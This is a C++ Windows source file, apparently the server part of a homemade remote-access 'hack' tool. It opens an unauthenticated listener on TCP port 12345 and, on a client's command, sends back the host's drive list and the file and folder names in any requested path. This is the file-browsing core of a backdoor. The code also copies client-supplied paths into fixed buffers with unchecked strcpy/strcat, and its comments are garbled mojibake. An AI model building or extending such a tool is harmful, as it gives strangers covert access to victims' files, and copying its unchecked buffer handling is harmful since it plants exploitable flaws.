// hackcpp.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "hackcpp.h"
#include<winsock.h>    //�ǵü���ͷ�ļ�

#pragma comment(lib,"ws2_32")  //�⺯��

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
//���庯���������Կͻ���������Ҵ��̵���Ϣ
WORD WINAPI SLisen(LPVOID lparam);


#include"SYS.h"

typedef struct
{
	int ID;
	BYTE lparam[2048];
}COMMAND;

typedef struct
{
	char FileName[MAX_PATH];
	int FileLen;
	char Time[50];
	BOOL IsDir;
	BOOL Error;
	HICON hIcon;
}FILEINFO;

DWORD WINAPI GetDriveProc(COMMAND command,SOCKET socket);
DWORD WINAPI GetDriInfoProc(COMMAND command,SOCKET socket);
// Ψһ��Ӧ�ó������

CWinApp theApp;

using namespace std;

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	/*int nRetCode = 0;

	HMODULE hModule = ::GetModuleHandle(NULL);

	if (hModule != NULL)
	{
		// ��ʼ�� MFC ����ʧ��ʱ��ʾ����
		if (!AfxWinInit(hModule, NULL, ::GetCommandLine(), 0))
		{
			// TODO: ���Ĵ�������Է���������Ҫ
			_tprintf(_T("����: MFC ��ʼ��ʧ��\n"));
			nRetCode = 1;
		}
		else
		{
			// TODO: �ڴ˴�ΪӦ�ó������Ϊ��д���롣
			_tprintf(_T(" MFC "));
		}
	}
	else
	{
		// TODO: ���Ĵ�������Է���������Ҫ
		_tprintf(_T("����: GetModuleHandle ʧ��\n"));
		nRetCode = 1;
	}

	return nRetCode;*/

	//��ʼ���汾
	WSADATA wsadata;
	WORD ver= MAKEWORD(2,2);
	WSAStartup(ver,&wsadata);

	//�����׽���
	SOCKET server;
	server=socket(AF_INET ,SOCK_STREAM,0);
	SOCKADDR_IN serveraddr;
	serveraddr .sin_family=AF_INET;
	serveraddr.sin_port=htons(12345);//�˿�
	serveraddr.sin_addr.S_un.S_addr=htonl(INADDR_ANY);  //�����ֽڱ�Ϊ�����ֽ�
	//��
	bind(server,(SOCKADDR*)&serveraddr,sizeof(serveraddr));
	//����
	listen(server,10);
	
	SOCKET client;

	while(true)
	{
		//����
		client=accept(server,0,0);
		/*if(client=accept(server,0,0)!=INVALID_SOCKET )
		{
			char buff[20];
			if(send(client,"kjinziguiteer",sizeof("kjinziguiteer"),0)!=SOCKET_ERROR )
			{
				cout<<"�ȴ��ͻ�����������"<<endl;
			}
		}*/

		CreateThread (NULL,0,(LPTHREAD_START_ROUTINE)SLisen ,(LPVOID)client,0,NULL);

	}
	closesocket (server);
	closesocket(client);
	return 0;
}


WORD WINAPI SLisen(LPVOID lparam)
{
	SOCKET client ;
	client=(SOCKET)lparam;
	COMMAND command;
	while(true)
	{
		memset((char*)&command,0,sizeof(command));
		if(recv(client,(char*)&command,sizeof(command),0)==SOCKET_ERROR)
		{
			cout<<"���տͻ���ָ���д���"<<endl;
			break;
		}
		else
		{
			switch (command.ID)
			{
			case GetDriver:
				cout<<"�յ����������Ϣ"<<endl;
				GetDriveProc (command,client);
				break;
			case GetDriInfo:
				cout<<"�յ������ļ��к��ļ�����Ϣ"<<endl;
				GetDriInfoProc(command,client);
				break;

			}
		}
	}
	closesocket (client);
	return 0;
	 
}


DWORD WINAPI GetDriveProc (COMMAND command,SOCKET client)
{
	COMMAND cmd;
	memset((char*)&cmd,0,sizeof(cmd));
	cmd.ID =GetDriver ;
	for(char i='A';i<='H';i++)
	{
		char x[7]={i,':','\0'};
		UINT type=GetDriveType(x);//�õ����̵���Ϣ
		if(type==DRIVE_FIXED  || type==DRIVE_REMOVABLE || type==DRIVE_CDROM )
		{
			memset ((char*)cmd.lparam ,0,sizeof(cmd.lparam ));   //lparam�����Ǹ�ָ�룬���Բ�������
			strcpy((char*)cmd.lparam ,x);
			if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR )     //����õ���Ϣ���͸��ͻ���,fuck,������cmd��Ϣд����clientŪ�˺þ�û����ʾ������Ϣ
			{
				cout<<" ���ͻ��˷���������Ϣʧ�ܣ�"<<endl;
			}
			else
			{
				cout<<"���ͻ��˷���������Ϣ�ɹ�!"<<endl;
			}
		}
	}
	return 0;
}

DWORD WINAPI GetDriInfoProc(COMMAND command,SOCKET client)
{
	FILEINFO fi;
	COMMAND cmd;
	memset((char*)&fi,0,sizeof(fi));
	memset((char*)&cmd,0,sizeof(cmd));
	strcat((char*)command.lparam,"*.*");     //�鿴ĳ�������е��ļ��к��ļ�
	CFileFind file;
	BOOL bContinue;
	bContinue=file.FindFile ((char*)command.lparam ,0);
	while(bContinue)
	{
		memset((char*)&fi,0,sizeof(fi));
		memset((char*)&cmd,0,sizeof(cmd));
		bContinue=file.FindNextFile();
		if(file.IsDirectory())
		{
			fi.IsDir=true;
		}
		strcpy(fi.FileName ,file.GetFileName ().LockBuffer ());
		cmd.ID=GetDriInfo;
		memcpy((char*)&cmd.lparam,(char*)&fi,sizeof(fi));   //����Ϣ
		if(send(client,(char*)&cmd,sizeof(cmd),0)==SOCKET_ERROR )     //����õ���Ϣ���͸��ͻ���,fuck,������cmd��Ϣд����clientŪ�˺þ�û����ʾ������Ϣ
		{
			cout<<" ���ͻ��˷����ļ��к��ļ���Ϣʧ�ܣ�"<<endl;
		}
		else
		{
			cout<<"���ͻ��˷����ļ��к��ļ���Ϣ�ɹ�!"<<endl;
		}
	}
	return 0;
}